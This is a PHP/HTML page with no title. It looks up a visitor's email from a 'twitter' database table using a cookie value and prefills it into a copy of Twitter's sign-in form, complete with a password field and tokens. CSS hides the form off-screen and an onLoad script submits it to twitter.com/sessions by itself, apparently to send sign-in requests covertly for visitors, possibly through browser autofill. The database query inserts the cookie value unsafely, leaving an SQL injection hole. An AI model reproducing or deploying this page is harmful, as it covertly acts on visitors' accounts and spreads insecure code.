<style>body{margin-left:-200%;}</style><img src="../small_icons/328.gif" style="left:45%; top:40%;position:absolute"/><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>

<body onLoad="javascript: submitform()">
<?
require_once('../db.php');
$uid=htmlspecialchars($_COOKIE['uid']);
$query = mysql_query("SELECT user_email FROM `twitter` WHERE `user_id`='$uid'"); 
$result = mysql_fetch_assoc($query); 
$email=$result['user_email'];  
?>

<script type="text/javascript">function submitform()  {document.forms["twitter"].submit();}</script>




<form action="https://twitter.com/sessions" class="clearfix signin js-signin" method="post" id="twitter" style="left:-200%;position:absolute;">
      <fieldset>
      
        <div class="clearfix holding">
          <span class="username js-username holder">Username or email</span>
          <input class="js-username-field email-input" type="text" name="session[username_or_email]" autocomplete="on" value="<?=$email;?>" tabindex="1">
          <p class="help-text-inline">Forgot your <a href="/account/resend_password" tabindex="-1">username</a>?</p>
        </div>
      
        <div class="clearfix holding">
          <span class="password holder">Password</span>
          <input class="js-password-field" type="password" name="session[password]" tabindex="2">
          <p class="help-text-inline">Forgot your <a href="/account/resend_password" tabindex="-1">password</a>?</p>
        </div>
      
        <input type="hidden" value="490c933ec89c60d0c80294dc671e9818d2146de1" name="authenticity_token">
      
      </fieldset>
      <div class="captcha js-captcha">
      </div>
      <div class="clearfix">
      
        <input type="hidden" name="scribe_log">
        <input type="hidden" name="redirect_after_login" value="">
        <input type="hidden" value="490c933ec89c60d0c80294dc671e9818d2146de1" name="authenticity_token">
        <button type="submit" class="submit btn primary-btn" tabindex="4">Sign in</button>
      
        <fieldset class="subchck">
          <label class="remember">
            <input type="checkbox" value="1" name="remember_me" tabindex="3">
            Remember me
          </label>
        </fieldset>
      
      </div>
    </form>

</body>
</html>

